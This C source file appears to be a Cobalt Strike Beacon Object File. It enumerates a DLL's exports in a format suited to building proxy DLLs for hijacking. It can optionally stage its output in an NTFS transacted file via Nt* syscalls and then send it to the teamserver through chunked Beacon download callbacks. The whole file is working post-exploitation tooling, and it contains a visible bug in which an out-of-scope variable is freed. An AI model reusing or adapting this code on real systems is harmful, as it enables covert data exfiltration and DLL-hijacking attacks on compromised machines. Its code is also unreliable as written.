#include <windows.h>
#include "headers/beacon.h"
#include "headers/syscalls.h"
#include "headers/win32_api.h"
#include <winnt.h>


// Forward declarations
void getExportedDLLNamesWin32(char* args, int arglength);
void depositFormatObjectContents(formatp* pFormatStruct, WINBOOL transactionDump);
BOOL extraFancyTransactionDump(const char* dataToDump, int dataSize);


void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
    //Intializes random number generator to create fileId 
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    //8 bytes for fileId and fileSize
    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);
 
    //pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    //pack on fileSize as 4-byte int second
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;

    //pack on the file name last
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex] = fileName[i];
        packedIndex++;
    }

     BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    if (fileSize > (1024 * 900)){
      
      //Lets see how many times this constant goes into our file size, then add one (because if it doesn't go in at all, we still have one chunk)
      int numOfChunks = (fileSize / (1024 * 900)) + 1;
      int index = 0;
      int chunkSize = 1024 * 900;

      while(index < fileSize) {
        if (fileSize - index > chunkSize){//We have plenty of room, grab the chunk and move on
            
            /*First 4 are the fileId 
	    then account for length of file
	    then a byte for the good-measure null byte to be included
            then lastly is the 4-byte int of the fileSize*/
            int chunkLength = 4 + chunkSize;
            char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
            
            //pack on fileId as 4-byte int first
            packedChunk[0] = (fileId >> 24) & 0xFF;
            packedChunk[1] = (fileId >> 16) & 0xFF;
            packedChunk[2] = (fileId >> 8) & 0xFF;
            packedChunk[3] = fileId & 0xFF;

            int chunkIndex = 4;

            //pack on the file name last
            for (int i = index; i < index + chunkSize; i++) {
                packedChunk[chunkIndex] = returnData[i];
                chunkIndex++;
            }

	     BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);

        } else {//This chunk is smaller than the chunkSize, so we have to be careful with our measurements
           
	    int lastChunkLength = fileSize - index + 4;
            char* lastChunk = (char*) MSVCRT$malloc(lastChunkLength);
            
	    //pack on fileId as 4-byte int first
            lastChunk[0] = (fileId >> 24) & 0xFF;
            lastChunk[1] = (fileId >> 16) & 0xFF;
            lastChunk[2] = (fileId >> 8) & 0xFF;
            lastChunk[3] = fileId & 0xFF;
            int lastChunkIndex = 4;
            
	    //pack on the file name last
            for (int i = index; i < fileSize; i++) {
                lastChunk[lastChunkIndex] = returnData[i];
                lastChunkIndex++;
            }
		BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
        }
        
	index = index + chunkSize;

      }

    } else {

        /*first 4 are the fileId
        then account for length of file
        then a byte for the good-measure null byte to be included
        then lastly is the 4-byte int of the fileSize*/
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*) MSVCRT$malloc(chunkLength);
        
        //pack on fileId as 4-byte int first
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;

        //pack on the file name last
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex] = returnData[i];
            chunkIndex++;
        }
	
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
    }


    //We need to tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    
    //pack on fileId as 4-byte int first
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

    return; 
}


BOOL extraFancyTransactionDump(const char* dataToDump, int dataSize)
{
    HANDLE hFile    = INVALID_HANDLE_VALUE;
    HANDLE tFile    = INVALID_HANDLE_VALUE;
    HANDLE mapFile  = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS status = 0;
    OBJECT_ATTRIBUTES objAttributes;
    void* returnData = NULL;
    SIZE_T ViewSize = 0;

    _RtlSetCurrentTransaction RtlSetCurrentTransaction = (_RtlSetCurrentTransaction) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlSetCurrentTransaction");
    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    
    InitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);

    status = NtCreateTransaction(&tFile, TRANSACTION_ALL_ACCESS, &objAttributes, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (status != 0)
    {
        if (tFile != INVALID_HANDLE_VALUE)
        {
            NtClose(tFile);
        }

        BeaconPrintf(CALLBACK_ERROR, "NtCreateTransaction failed, returning and freeing: %lx.\n", status);
        return FALSE;
    }

    status = RtlSetCurrentTransaction(tFile);
    if (status != 1)
    {
        if (tFile != INVALID_HANDLE_VALUE)
        {
            NtClose(tFile);
        }

        BeaconPrintf(CALLBACK_ERROR, "RtlSetCurrentTransaction failed, returning and freeing: %lx.\n", status);

        return FALSE;
    }

    PCWSTR filePath = L"\\??\\C:\\SomeBogusFile1221.txt";
    UNICODE_STRING unicodeString;
    RtlInitUnicodeString(&unicodeString, filePath);

    InitializeObjectAttributes(&objAttributes, &unicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    const int allocSize = 0;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = allocSize;

    status = NtCreateFile(&hFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE, &objAttributes, &IoStatusBlock, &largeInteger, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status != 0)
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            NtClose(hFile);
        }

        if (tFile != INVALID_HANDLE_VALUE)
        {
            NtClose(tFile);
        }

        BeaconPrintf(CALLBACK_ERROR, "NtCreateFile failed, returning and freeing: %lx.\n", status);
        
        return FALSE;
    }

    status = RtlSetCurrentTransaction(0);
    if (status != 1)
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            NtClose(hFile);
        }

        if (tFile != INVALID_HANDLE_VALUE)
        {
            NtClose(tFile);
        }

        BeaconPrintf(CALLBACK_ERROR, "RtlSetCurrentTransaction failed with status %lx\n", status);

        return FALSE;
    }


    DWORD dwBytesWritten = 0;
    BOOL successfulWrite = KERNEL32$WriteFile(hFile, dataToDump, (DWORD)dataSize, &dwBytesWritten, NULL);
    
    if (successfulWrite == TRUE)
    {
        LARGE_INTEGER fs;
        BOOL success = KERNEL32$GetFileSizeEx(hFile, &fs);
        unsigned long long fileSize = fs.QuadPart;

        status = NtCreateSection(&mapFile, SECTION_MAP_READ, 0, &largeInteger, PAGE_READONLY, SEC_COMMIT, hFile);

        if (status != 0)
        {
            if (hFile != INVALID_HANDLE_VALUE)
            {
                NtClose(hFile);
            }

            if (tFile != INVALID_HANDLE_VALUE)
            {
                NtClose(tFile);
            }
            
            BeaconPrintf(CALLBACK_ERROR, "NtCreateSection failed with status %lx\n", status);
            
            return FALSE;
        }

        status = NtMapViewOfSection(mapFile, (HANDLE)-1, &returnData, 0, 0, 0, &ViewSize, ViewUnmap, 0, PAGE_READONLY);
        if (status != 0)
        {
            if (hFile != INVALID_HANDLE_VALUE)
            {
                NtClose(hFile);
            }

            if (tFile != INVALID_HANDLE_VALUE)
            {
                NtClose(tFile);
            }

            BeaconPrintf(CALLBACK_ERROR, "NtMapViewOfSection failed with status %lx\n", status);
            
            return FALSE;
        }

        int downloadFileNameLength;
        char* downloadFileName;

        downloadFileNameLength = MSVCRT$_snprintf(NULL,0,"%i", 12345) + 9;
        downloadFileName = (char*) MSVCRT$malloc(downloadFileNameLength);
        MSVCRT$sprintf(downloadFileName, "mem:\\%d.txt", 12345);

        BeaconPrintf(CALLBACK_OUTPUT, "Checks passed, download should occur shortly!\n");
        downloadFile(downloadFileName, downloadFileNameLength, returnData, fileSize);
    }

    if (tFile)
    {
        NtClose(tFile);
    }

    if (hFile)
    {
        NtClose(hFile);
    }

    return TRUE;
}


void depositFormatObjectContents(formatp* pFormatStruct, WINBOOL transactionDump)
{
    char* outputString = NULL;
    int sizeOfObject   = 0;

    outputString = BeaconFormatToString(pFormatStruct, &sizeOfObject);
    
    if (transactionDump == FALSE)
    {
        BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
    }
    else
    {
        BOOL dumpedResult = extraFancyTransactionDump(outputString, sizeOfObject);
        if (dumpedResult != TRUE)
	{
            BeaconOutput(CALLBACK_OUTPUT, outputString, sizeOfObject);
	}
    }

    BeaconFormatFree(&formatObject);
    
    return;
}


void getExportedDLLNamesWin32(char* args, int arglength) 
{
    datap parser;
    formatp formatObject;

    char* fileToEnumerate = NULL;
    char* fileWithoutBase = NULL;
    int   getNumberOfFunctionsOnly;
    int   getTransactionData;

    BeaconDataParse(&parser, args, arglength);
    getNumberOfFunctionsOnly = BeaconDataInt(&parser);
    getTransactionData = BeaconDataInt(&parser);
    fileToEnumerate = BeaconDataExtract(&parser, NULL);
    fileWithoutBase = BeaconDataExtract(&parser, NULL);
    
    BeaconFormatAlloc(&formatObject, 128 * 1024);

    HANDLE hFile = KERNEL32$CreateFileA(fileToEnumerate, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error in ascertaining file handle.\n");
        BeaconFormatFree(&formatObject);
        
        return;
    }

    HANDLE hMappedFile = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if ((hMappedFile == INVALID_HANDLE_VALUE) | (hMappedFile == 0))
    {
        BeaconPrintf(CALLBACK_ERROR, "Error in creating file mapping.\n");
        BeaconFormatFree(&formatObject);
        NtClose(hFile);

        return;
    }

    unsigned char* fileMapping = (unsigned char*)KERNEL32$MapViewOfFile(hMappedFile, FILE_MAP_READ, 0, 0, 0);
    if (!fileMapping)
    {
        BeaconPrintf(CALLBACK_ERROR, "Error in mapping view of file.\n");
        BeaconFormatFree(&formatObject);
        NtClose(hMappedFile);
        NtClose(hFile);

        return;
    }

    PIMAGE_DOS_HEADER imageDosHeader = (PIMAGE_DOS_HEADER)fileMapping;
    if (imageDosHeader)
    {
        PIMAGE_NT_HEADERS64 pnth = (PIMAGE_NT_HEADERS64)(fileMapping + imageDosHeader->e_lfanew);
        
        if (pnth->Signature == IMAGE_NT_SIGNATURE)
        {
            WORD wArchHint = pnth->OptionalHeader.Magic;
            if (wArchHint == 0x10b)
            {
                if (getNumberOfFunctionsOnly != 0)
                {
                    BeaconFormatPrintf(&formatObject, "Filename - %s\nEXPORTS\n", fileToEnumerate);
                }
                
                PIMAGE_NT_HEADERS32 pntHeader = (PIMAGE_NT_HEADERS32)(fileMapping + imageDosHeader->e_lfanew);
                PIMAGE_EXPORT_DIRECTORY piedExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(fileMapping + pntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                DWORD dwOrdinalBase = piedExportDirectory->Base;
                unsigned int uiIndex = 0;

                for (uiIndex; uiIndex < piedExportDirectory->NumberOfNames; ++uiIndex, dwOrdinalBase++)
                {
                    char* szFilestuff = (char*)(fileMapping + ((unsigned long*)(fileMapping + piedExportDirectory->AddressOfNames))[uiIndex]);
                    if (getNumberOfFunctionsOnly != 0)
                    {
                        BeaconFormatPrintf(&formatObject, "\t%s=%s.%s\t@%d\n", szFilestuff, fileWithoutBase, szFilestuff, dwOrdinalBase);
                    }
                }

                if (getNumberOfFunctionsOnly == 0)
                {
                    BeaconFormatPrintf(&formatObject, "Total functions found: %d\n", uiIndex);
                }

            }
            else if (wArchHint == 0x20b)
            {
                if (getNumberOfFunctionsOnly != 0)
                {
                    BeaconFormatPrintf(&formatObject, "Filename - %s\nEXPORTS\n", fileToEnumerate);
                }

                PIMAGE_NT_HEADERS64 pntHeader = (PIMAGE_NT_HEADERS64)(fileMapping + imageDosHeader->e_lfanew);
                PIMAGE_EXPORT_DIRECTORY piedExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(fileMapping + pntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                DWORD dwOrdinalBase = piedExportDirectory->Base;
                unsigned int uiIndex = 0;

                for (uiIndex; uiIndex < piedExportDirectory->NumberOfNames; ++uiIndex, dwOrdinalBase++)
                {
                    char* szFilestuff = (char*)(fileMapping + ((unsigned long*)(fileMapping + piedExportDirectory->AddressOfNames))[uiIndex]);
                    if (getNumberOfFunctionsOnly != 0)
                    {
                        BeaconFormatPrintf(&formatObject, "\t%s=%s.%s\t@%d\n", szFilestuff, fileWithoutBase, szFilestuff, dwOrdinalBase);
                    }
                }

                if (getNumberOfFunctionsOnly == 0)
                {
                    BeaconFormatPrintf(&formatObject, "Total functions found: %d\n", uiIndex);
                }
            }
        }
    }

    if (fileMapping)
    {
        KERNEL32$UnmapViewOfFile(fileMapping);
    }

    if (hMappedFile)
    {
        NtClose(hMappedFile);
    }

    if (hFile)
    {
        NtClose(hFile);
    }

    if (getTransactionData)
    {
        depositFormatObjectContents(&formatObject, TRUE);
    }
    else
    {
        depositFormatObjectContents(&formatObject, FALSE);
    }
    
    return;
}
